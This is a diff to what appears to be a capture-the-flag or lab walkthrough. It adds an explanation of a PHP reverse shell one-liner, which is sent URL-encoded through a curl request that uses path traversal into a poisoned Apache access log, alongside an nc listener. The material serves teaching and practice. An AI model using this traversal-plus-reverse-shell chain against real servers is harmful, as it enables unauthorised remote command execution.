@@ -155,6 +155,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 nc -lvnp 4444
 ```
 
+The actual command passed to `cmd` is:
+
+```bash
+php -r '$sock=fsockopen("<KALI_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+- `fsockopen()` opens a TCP connection back to Kali
+- `exec()` launches an interactive shell with stdin/stdout/stderr all redirected through that socket
+
+This is passed via the URL's `cmd` parameter, so it must be **URL-encoded** — characters like spaces (`%20`), `$` (`%24`), `(` (`%28`), and `'` (`%27`) have special meaning in URLs and would be misinterpreted or stripped by the browser/curl if sent raw. Encoding them as `%XX` ensures they reach the server intact.
+
 ```bash
 curl "http://<TARGET_IP>/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22<KALI_IP>%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27"
 ```
